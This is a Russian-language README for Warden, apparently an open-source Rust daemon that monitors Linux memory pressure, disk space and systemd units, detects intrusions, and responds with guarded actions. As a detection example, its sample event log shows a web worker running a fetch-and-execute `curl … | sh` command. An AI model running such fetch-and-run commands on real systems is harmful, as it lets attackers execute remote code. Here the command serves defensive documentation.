<div align="center">

# 🛡️ Warden

**Демон-страж для Linux-серверов и рабочих станций — полностью на Rust.**

Warden следит за здоровьем машины и *действует*, когда что-то идёт не так: он ловит давление на память и своп-штормы **до** OOM-killer'а, до того как сервер «зависнет на десять минут»; не даёт дискам заполниться; обнаруживает и изолирует вторжения — веб-шеллы, reverse shell, майнеры, повышение привилегий, закрепление в системе — с защищённым, настраиваемым автоматическим реагированием.

[Архитектура](docs/architecture.md) · [Детекторы и события](docs/detectors.md) · [Заметки о безопасности](docs/security.md) · [Эталонный конфиг](config/warden.toml) · [Warden Lab Kit](scripts/warden-lab-kit)

</div>

---

## Зачем нужен Warden

`free -h` врёт вам. К тому моменту, как он покажет мало памяти, ядро уже секундами тормозит ваши процессы, освобождая и снова отдавая страницы, а до машины не достучаться по SSH. Классический мониторинг говорит вам *после* инцидента. Warden использует **Pressure Stall Information (PSI)** ядра — фактическое время, которое ваши задачи теряют в ожидании памяти, CPU и I/O — чтобы увидеть формирующуюся проблему и либо оповестить вас, либо убить нужный процесс *до* того, как машина зависнет.

Тот же демон следит за обыденными катастрофами, которые валят серверы в 3 часа ночи (журнал, заполняющий корневую файловую систему; файловая система, ушедшая в read-only; переполненная таблица conntrack; упавший юнит), и за умышленными (PHP-воркер, запускающий `curl … | sh`; веб-шелл, появившийся в `wp-content/uploads`; процесс, ставший root в обход `sudo`; новый SUID-бинарник в `/tmp`). Первое он умеет исправлять автоматически, второе — изолировать, и всё это под строгими правилами безопасности, так что он никогда не убьёт вашу базу данных или вашу SSH-сессию.

Один самодостаточный бинарник (динамически слинкован только с glibc ≥ 2.34 и libgcc). Никакого агента в ядре, никакого тулчейна eBPF, никакого рантайма Python. Пакет `.deb` устанавливается и работает на Debian 12, Ubuntu 22.04 и 24.04 (проверяется в CI); любой Linux с glibc 2.34+ запускает его из архива (возможности ядра: см. [Совместимость](#совместимость)).
Достаточно мал для VPS на 1 ГиБ: ~10 МиБ RSS с типичным набором детекторов, ~33 МиБ со всеми модулями и сайтом на 20 000 файлов под FIM; у выключенного модуля нет ни потока, ни памяти ([замеры](docs/performance.md)).

## Ключевые возможности

- **Давление на память и своп-штормы (PSI).** Обнаруживает устойчивые простои и трэшинг с настраиваемым временем обнаружения, регистрирует триггер PSI в ядре для мгновенного пробуждения, ранжирует настоящего виновника (что освободит kill — анонимная память + своп — плюс OOM-«плохость» и активность подкачки) и может убить его до того, как OOM-killer ядра выберет не ту жертву; kill, не освободивший память, останавливает дальнейшие kill'ы до конца эпизода. Warden делает `mlock` себе, чтобы оставаться отзывчивым, пока хост трэшит.
- **Обнаружение зависания всего хоста.** Измеряет, насколько поздно просыпается его собственный высокоприоритетный планировщик, залоченный в памяти, — прямой сигнал, что машина была неотзывчива, с диагностическим снимком, снятым во время зависания.
- **Самовосстановление диска.** Место, inode'ы, ремонтирование в read-only и *прогноз* скорости заполнения. Упорядоченный плейбук очистки (vacuum journald, `apt clean`, удаление старых логов, усечение огромных логов, освобождение удалённых-но-открытых файлов) выполняется только на затронутой файловой системе и никогда не трогает системные каталоги. Когда очистка не помогает, ограниченный фоновый `du` сообщает, **кто занимает диск** (самые большие каталоги и файлы) — `wardenctl du` делает то же по запросу.
- **Обнаружение вторжений по событиям процессов в реальном времени.** Через netlink **proc connector** (без eBPF): повышение привилегий, fileless-запуск, reverse shell, криптомайнеры, маскировка процессов, инъекция через LD_PRELOAD, инъекция через ptrace и веб-воркеры, порождающие shell/загрузчики. Повторяющиеся безобидные exec'и (сборочные серверы, штормы cron) идут быстрым путём, который читает один файл `/proc` вместо шести.
- **Мониторинг целостности веб-файлов.** BLAKE3-базлайны каждого скрипта на ваших сайтах, проверяемые по расписанию *и* в реальном времени через **fanotify** (который сообщает **PID писателя** — тот самый воркер, заразивший файл). Движок сигнатур помечает веб-шеллы/дропперы в PHP, Node, Python, JSP/ASP и трюки с `.htaccess`; корреляция с access-log называет запрос, который посадил файл, и блокирует IP, использующие шелл.
- **Целостность системы и auth.** Базлайны `/etc/passwd`, sudoers, SSH-ключей, cron, юнитов systemd, `ld.so.preload`, PAM… (с проверкой по контрольным суммам dpkg, чтобы обновления пакетов не давали ложных срабатываний), видит новый SUID/SGID-файл **в момент его появления** (метки файловой системы fanotify; еженедельный обход остаётся страховкой), следит за слушающими сокетами и разбирает journald/auth.log на предмет SSH-брутфорса (с автоматической блокировкой), root-логинов и изменений учётных записей.
- **Интеграция с ModSecurity (v2 и v3).** Читает аудит-лог (нативный или JSON) или error.log Apache/nginx, блокирует клиентов, которых ModSecurity постоянно останавливает (она судит запросы, Warden запоминает атакующих), и ставит первыми IP, помеченные WAF, при поиске запроса, посадившего веб-шелл.
- **Работает с любым веб-стеком.** nginx, Apache, LiteSpeed; PHP через FPM, mod_php, CGI/FastCGI/mod_fcgid, suEXEC/mpm-itk с пользователями на сайт; Node, Python, Ruby, Java-серверы приложений — см. [docs/integrations.md](docs/integrations.md).
- **Упавшие юниты systemd в реальном времени.** Изменения состояния юнитов приходят по D-Bus (без процесса `systemctl` каждые 30 с); опциональный авто-рестарт с часовым лимитом.
- **Зависшие сервисы, микросервисы, базы данных.** Проверки здоровья HTTP/TCP/командой перезапускают сервисы, которые живы, но не отвечают (`pg_isready`, `redis-cli ping`, `/health`); правила `[[process.limit]]` троттлят или убивают зависшие скрипты (CPU в течение N минут, время жизни, RSS); обнаруживается СУБД, порождающая shell (SQLi → RCE); события называют контейнер Docker/Podman/Kubernetes и сервис, чей собственный лимит памяти был исчерпан.
- **Адаптируется к машине.** Пороги памяти масштабируются под объём RAM и следуют лимиту cgroup внутри контейнеров. Советник по тюнингу объясняет, какие sysctl не подходят вашему железу и нагрузке; ёмкостные лимиты (conntrack, pid_max, file-max) могут расти автоматически в пределах вычисленных из RAM границ — поведенческие настройки никогда не меняются за вашей спиной.
- **Эвристический скоринг.** Отдельные находки накапливают подозрительность по процессу и по IP с экспоненциальным затуханием; переход через порог изолирует процесс или блокирует адрес. Он также учит нормальную цепочку родитель→потомок для каждого сервиса и помечает никогда не виденные.
- **Защищённое авто-реагирование.** kill (без гонок через pidfd), SIGSTOP для форензики, throttle (nice + idle I/O), заморозка/kill cgroup, перезапуск юнита, лимиты юнита на лету, карантин файла (даже сделанного `chattr +i`), блокировка IP (nftables с таймаутами ядра), ограниченный рост sysctl, диагностические снимки, очистка или ваш собственный хук. Защитные списки процессов, предохранители, cooldown'ы на цель, path-guard'ы и глобальный **dry-run** держат это безопасным.
- **Управляемость.** Prometheus `/metrics` и `/health`, журнал событий в JSON-lines, уведомления Slack/Mattermost/Telegram/командой, богатый `wardenctl`, живая перезагрузка конфига и офлайн-`wardenctl doctor`.

## Как это выглядит

```console
$ wardenctl status
Warden 0.14.1 on web-01 — pid 914, up 6days 2h  
Levels:   memory ok   cpu ok   io ok   disk warning
Sensors:  psi_trigger running · kmsg running · proc_connector running ·
          auth running · fim_realtime running · access_log running
FIM sites: ["main","api"]      Max heuristic score: 0

$ wardenctl events -n 6
12:41:07 critical  memory.swap_storm      swap storm for 64s: 3100 pages/s swapped, PSI full 42.1%
                   actions: snapshot, kill
12:41:07 warning   action.kill            kill php-fpm8.3[20433] → done: killed after 5s, released ~1.9GiB
12:55:19 critical  security.web_spawn     web worker php-fpm8.3[21044] (www-data) spawned sh: sh -c curl -s http://… | sh
                   actions: kill
12:55:19 critical  security.webshell      malicious code in site main: /wp-content/uploads/cache.php (score 230)
                   actions: quarantine, restart_unit
12:55:20 critical  security.webshell_access  203.0.113.66 requested flagged file /wp-content/uploads/cache.php
                   actions: block_ip
12:55:20 warning   action.block_ip        block_ip 203.0.113.66 → done: blocked for 24h

$ wardenctl mem-top -n 3 --interval 2s
memory PSI: some avg10=38.20 | full avg10=12.80  (full = all tasks stalled)
     PID        RSS       SWAP       PEAK     MAJFLT/s  COMMAND
   20433     1.9GiB   412.0MiB     2.1GiB        880.0  php-fpm8.3
    1044   820.0MiB    12.0MiB   900.0MiB         12.0  mysqld
```

## Установка

### Из исходников (любой дистрибутив)

```bash
# 1. Rust для вашего обычного пользователя (не root): https://rustup.rs
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env

# 2. Собирайте как обычный пользователь — никогда через sudo
git clone https://github.com/commeta/warden && cd warden
cargo build --release

# 3. Установите как root (профили: webserver | workstation | database)
sudo ./scripts/install.sh --profile webserver
# отредактируйте /etc/warden/warden.toml и conf.d/ (как минимум: корни сайтов FIM, allowlist фаервола);
# он стартует в режиме наблюдения (dry_run = true) — см. "Быстрый старт и безопасный раскат"
sudo wardenctl doctor
sudo systemctl enable --now wardend
```

`install.sh`, запущенный через sudo, собирает от имени вызывающего пользователя *его* тулчейном, если бинарники отсутствуют или устарели, так что шаг 2 можно и пропустить. Повторный запуск обновляет бинарники и юнит, сохраняет вашу конфигурацию (новые эталонные файлы ложатся рядом как `*.new`) и перезапускает работающий сервис.

Для сборки требуется Rust ≥ 1.88 (edition 2024, `let` chains). Рекомендуемые инструменты рантайма: `nftables` (блокировка IP) и `systemd`/`journalctl` (события auth, vacuum журнала). Без них Warden деградирует изящно — `wardenctl doctor` скажет, чего стоит каждая недостающая часть.

### Пакет Debian / Ubuntu

```bash
./scripts/build-deb.sh            # как обычный пользователь → target/debian/warden_0.14.1-1_amd64.deb
sudo apt install ./target/debian/warden_*.deb
./scripts/build-deb.sh --portable # для других машин: слинкован в контейнере Ubuntu 22.04 (docker/podman),
                                  # → target/portable/debian/…, ставится на Debian 12, Ubuntu 22.04 и новее
```

Обычная сборка требует glibc той машины, на которой собиралась (2.39 на Ubuntu 24.04), и её пакет об этом говорит; собирайте с `--portable` для пакета, который нужно ставить в другом месте.

Пакет устанавливает оба бинарника, юнит systemd (не включён и не запущен), эталонный конфиг как conffile (`dry_run = true`) и примеры drop-in'ов/сигнатур под `/usr/share/warden/`. Включите его сами, когда конфигурация проверена: `sudo systemctl enable --now wardend`. Обновление перезапускает работающий сервис и не трогает остановленный.

### Устранение неполадок установки

| симптом | причина | решение |
|---|---|---|
| `sudo ./scripts/install.sh` → `cargo not found` | sudo сбрасывает `PATH` (`secure_path`), rustup живёт в `~/.cargo/bin` | исправлено в 0.10: скрипт находит ваш тулчейн; или `cargo build --release`, затем `sudo ./scripts/install.sh --no-build` |
| `rustup could not choose a version of cargo to run` | cargo запущен как root с вашим `PATH`, но у root нет rustup-дефолта | собирайте как ваш пользователь (выше); не запускайте cargo через sudo |
| `cargo install cargo-deb` → `Permission denied (os error 13)` в `~/.cargo/registry` | более ранний `sudo -E … cargo` записал файлы, принадлежащие root, в ваш домашний каталог | `sudo chown -R "$USER": ~/.cargo ~/.rustup ./target` (install.sh 0.10 исправляет это автоматически) |
| `wardend.service: Main process exited, code=dumped, status=31/SYS` | seccomp-фильтр юнита 0.9 убил демон (fanotify/adjtimex не разрешены) | установите 0.10 (`sudo ./scripts/install.sh`), затем `sudo systemctl reset-failed wardend && sudo systemctl restart wardend`; `wardenctl doctor` проверяет установленный юнит |
| сенсор показывает `unavailable … (os error 1)` | не хватает capability или вызов блокирован изменённым юнитом | `wardenctl doctor` называет, чего именно |

## Быстрый старт и безопасный раскат

Warden поставляется безопасным: разрушительные действия консервативны, и каждое из них закрыто шлюзом. Рекомендуемый путь:

1. Начните в **dry-run**. Это поставляемый по умолчанию режим (`dry_run = true` в `warden.toml`; и `install.sh`, и `.deb` оставляют его включённым): Warden обнаруживает и сообщает всё, но ничего не меняет. Что он *сделал бы*, есть в журнале событий — см. [docs/events.md](docs/events.md) про каждое событие и значения полей.
2. Понаблюдайте день: `wardenctl events -f`, `wardenctl scores`, `wardenctl top`.
3. Заглушите ложные срабатывания правилами `[[policy]]` (скопируйте `subject`/`cmdline` события в правило `suppress` или `alert_only`).
4. Включите реагирование: `wardenctl dry-run off` действует сразу и сохраняется между reload'ами и рестартами (хранится в каталоге состояния; `wardenctl status` показывает, что решило режим, `wardenctl dry-run reset` возвращает к конфигурации). Или задайте `dry_run = false` в `warden.toml` и `systemctl reload wardend` (или установите с `install.sh --enforce`); изменение `dry_run` в конфигурации побеждает более старый override.

## Конфигурация

Всё живёт в `/etc/warden/warden.toml`, с drop-in'ами в `/etc/warden/conf.d/*.toml` (сливаются по порядку; списки записей вроде `[[fim.site]]`, `[[policy]]`, `[[health.check]]` добавляются, всё остальное — включая плейбуки вроде `disk.cleanup` или `memory.on_critical` — заменяется). Пустой файл валиден — у каждой настройки есть производственно-разумный дефолт. Опечатка — ошибка старта, а не молча проигнорированная настройка:

```bash
wardend --check-config          # validate
wardend --print-defaults        # dump all defaults as commented TOML
```

Полностью закомментированный [`config/warden.toml`](config/warden.toml) документирует каждую опцию. Минимальное дополнение для веб-сервера:

```toml
# /etc/warden/conf.d/90-sites.toml
[[fim.site]]
name = "main"
root = "/var/www/html"
access_log = "/var/log/nginx/access.log"
restart_unit = "php8.3-fpm.service"

[actions.firewall]
allowlist = ["127.0.0.0/8", "::1/128", "198.51.100.0/24"]   # your admin/monitoring nets

[systemd]
auto_restart = ["nginx.service", "php8.3-fpm.service"]
```

### Тот самый «время обнаружения» из запроса

```toml
[memory.swap_storm]
sustain = "60s"   # how long sustained swapping must last before Warden acts
                  # ("долгий свопинг, когда сервер зависает надолго")
```
и триггер PSI в ядре для мгновенной реакции:
```toml
[memory.trigger]
enabled = true
kind    = "some"     # or "full"
stall   = "150ms"    # like: echo "some 150000 1000000" > /proc/pressure/memory
window  = "1s"
```

## Шпаргалка `wardenctl`

| команда | что делает |
|---|---|
| `wardenctl status` | уровни, сенсоры, состояние обучения |
| `wardenctl events [-n N] [-s warning] [-f]` | последние события (слежение с `-f`) |
| `wardenctl top` | ранжирование виновников памяти (кого убьют и почему) |
| `wardenctl scores` | живые оценки эвристической подозрительности |
| `wardenctl mem-top --interval 2s` | RSS/swap/major-faults-в-секунду по процессам |
| `wardenctl psi` | текущий PSI для cpu/memory/io |
| `wardenctl fim status \| scan [site] \| accept <site> [path] \| pause <site> 30m` | управление FIM (пауза вокруг деплоев) |
| `wardenctl block <ip> [--ttl 1h] \| unblock <ip> \| blocklist` | фаервол |
| `wardenctl quarantine list \| restore <id>` | файлы в карантине |
| `wardenctl snapshot [reason]` | снять диагностический снимок сейчас |
| `wardenctl tuning [--revert]` | советы по тюнингу ядра; изменения sysctl, сделанные Warden (и откат) |
| `wardenctl profile [-i 10]` | **собственные** CPU / I/O / память Warden по потокам, детекторам и областям кучи |
| `wardenctl doctor` | **офлайн**-проверка возможностей хоста + диагностика установленного юнита (seccomp/caps/crash) |
| `wardenctl scan /var/www` | **офлайн**-скан дерева сигнатурами |
| `wardenctl du [/var] [-d 2] [-n 15] [--idle]` | **офлайн**-«кто занимает диск»: самые большие каталоги по уровням и файлы (одна файловая система, с ограничениями) |

## Наблюдаемость

`http://127.0.0.1:9184/metrics` (Prometheus) отдаёт PSI-гейджи, память/своп, заполнение диска и ETA заполнения по точке монтирования, время тика по детектору, счётчики событий/действий, освобождённые байты, размер блоклиста, up/down сенсоров и многое другое.
`/health` возвращает 503, если heartbeat быстрого планировщика устарел (тот же сигнал, что питает watchdog systemd). Warden также профилирует себя:
`warden_module_cpu_seconds_total`, `warden_module_heap_bytes`,
`warden_thread_cpu_seconds_total`, `warden_self_cgroup_memory_bytes{kind=anon|page_cache|kernel}`
— см. [docs/performance.md](docs/performance.md), сколько стоит каждый модуль. Каждое событие и результат действия также пишется как JSON в `/var/log/warden/events.jsonl` (с ротацией).

## Структура проекта

```
crates/
  warden-core/      config · events · actions · policy · hysteresis · rate limits   (pure, no I/O)
  warden-sys/       PSI · procfs · pidfd · cgroup v2 · kmsg · netlink · fanotify · nftables
  warden-detect/    detectors · sensors · FIM (signatures + correlation) · ModSecurity · health checks ·
                    tuning advisor · heuristics · scheduler
  warden-respond/   guarded actions: kill · stop · throttle · cgroup · unit limits · quarantine · cleanup ·
                    firewall · sysctl · snapshot
  wardend/          the daemon: engine · event log · notifications · control + metrics servers
  wardenctl/        control CLI + offline diagnostics
config/             reference warden.toml, conf.d profiles (webserver, database, workstation), example signatures
packaging/          systemd unit, nftables template, deb maintainer scripts
scripts/            install.sh · uninstall.sh · build-deb.sh [--portable] · check-seccomp.sh · check-glibc.sh ·
                    test-deb-install.sh
fuzz/               cargo-fuzz targets for every parser of untrusted input (bodies in crates/warden-fuzz)
bench/              profile.py (per-module CPU/I/O/RAM matrix) · dhat_modules.py (heap by module)
docs/               architecture · detectors · integrations (web stacks, ModSecurity, DB, containers) · security ·
                    events (catalogue of every event) · performance (measured cost of every module) ·
```

## Сборка и тестирование

```bash
cargo build --release --workspace
cargo test  --workspace        # unit tests; some need root (procfs/pidfd/fanotify) — run with sudo
sudo cargo test --workspace    # includes the end-to-end daemon test
cargo clippy --workspace --all-targets -- -D warnings
sudo ./scripts/check-seccomp.sh   # the unit allows every syscall and socket family the daemon uses
sudo cargo llvm-cov --workspace   # line coverage (CI floor: .github/coverage-floor)
cd fuzz && cargo +nightly fuzz run access_log   # libFuzzer; `cargo test -p warden-fuzz` is the stable smoke run
./scripts/build-deb.sh --portable # the release package (linked in an Ubuntu 22.04 container)
```

CI дополнительно ставит настоящий юнит systemd на свежую ВМ Ubuntu 24.04, запускает его, проверяет, что он остаётся работать без рестартов и core dump'ов, и заставляет поймать веб-шелл — класс отказов, который unit-тесты увидеть не могут. Он собирает `.deb` на Ubuntu 22.04 и устанавливает и запускает его в чистых контейнерах Debian 12, Ubuntu 22.04 и 24.04; измеряет покрытие на каждом push и pull request (сводка задания и комментарий в PR; сборка падает ниже порога или когда покрытие падает более чем на полпункта относительно последнего замера main); и фаззит каждый парсер недоверенного ввода по минуте на цель.

Набор тестов обширен и намеренно задействует реальные интерфейсы ядра (он разбирает живой `/proc`, открывает pidfd, регистрирует триггеры PSI и метки fanotify), а не только моки, плюс полный end-to-end тест, который поднимает бинарник `wardend` и обрушивает на него настоящие инциденты.

## Совместимость

| возможность | требует | без этого |
|---|---|---|
| бинарники | glibc 2.34+ (Debian 12, Ubuntu 22.04, RHEL 9 и новее) | — |
| давление PSI и триггеры | Linux 4.20+, `CONFIG_PSI=y` (загрузка с `psi=1` на RHEL) | обнаружение давления деградирует |
| kill без гонок | pidfd (Linux 5.3+) | откат к перепроверке времени старта |
| события процессов в реальном времени | proc connector + `CAP_NET_ADMIN` (события fork фильтруются в ядре на 6.6+) | откат к периодическим сканам `/proc` |
| обнаружение SUID/SGID в реальном времени | fanotify `FAN_REPORT_DFID_NAME` (Linux 5.9+), `CAP_SYS_ADMIN` + `CAP_DAC_READ_SEARCH` | только периодический обход |
| мгновенные оповещения об упавших юнитах | systemd + системная D-Bus | опрос `systemctl` каждые `systemd.interval` |
| веб-FIM в реальном времени | fanotify + `CAP_SYS_ADMIN` | откат к плановым сканам |
| заморозка/kill сервиса | cgroup v2 | эти действия недоступны |
| блокировка IP | `nft` | действия блокировки падают (сообщается) |
| события auth, vacuum журнала | systemd/journalctl (иначе auth.log) | читает файл лога вместо этого |
| корреляция WAF | ModSecurity v2 или v3, пишущая аудит- или error-лог | — |
| карантин файлов с `chattr +i` | `CAP_LINUX_IMMUTABLE` (выдаётся юнитом) | карантин падает с EPERM (сообщается) |

Запустите `wardenctl doctor` на любом хосте для окончательного отчёта.

## Лицензия

MIT — см. [LICENSE](LICENSE).

> ⚠️ **Бета.** Warden выполняет разрушительные действия на вашей системе. Начните с
> `dry_run = true` (значение по умолчанию), просмотрите, что бы он сделал, и держите лимиты
> предохранителей консервативными, пока не доверитесь ему в вашей среде.
